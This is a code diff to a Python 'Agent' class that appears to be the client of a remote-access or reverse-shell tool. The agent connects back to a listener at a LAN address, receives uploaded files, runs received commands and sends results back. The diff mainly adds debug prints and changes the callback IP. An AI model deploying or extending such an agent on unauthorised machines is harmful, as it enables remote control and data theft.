@@ -91,10 +91,11 @@ class Agent:
 
             if   (buffer <= remainBytes): fileBytes += self.localSocket.recv(buffer)
             elif (remainBytes < buffer):  fileBytes += self.localSocket.recv(remainBytes)
-        
+
         file.write(fileBytes)
         file.close()
         self.localSocket.send(b"OK")
+        print(fileBytes)
         
         return f"[+] Agent: Downloaded {len(fileBytes)} bytes of data\n[+] Agent: File successfully saved to {destination}\n"
     # END OF recvFile METHOD
@@ -127,6 +128,7 @@ class Agent:
             # Receive file and save
             elif (cmdList[0].lower() == "upload") and (1 < len(cmdList)):
                 result = self.recvFile(cmdList)
+                print("File received and saved")
             
             # Handle blacklist command
             elif (cmd in cmdBlacklist): 
@@ -178,6 +180,7 @@ class Agent:
                 commandResult = self.processCommand(command)
 
                 self.sendData(commandResult)
+                print("Command result sent")
 
         except KeyboardInterrupt:
             print("[!] Exiting the program\n")
@@ -193,7 +196,7 @@ class Agent:
 
 # BEGINNING OF MAIN =====
 
-agent = Agent("127.0.0.1", 7399) # Change the IP address to the IP address of the listening computer
+agent = Agent("192.168.0.101", 7399)
 agent.execute()
 
 # END OF MAIN
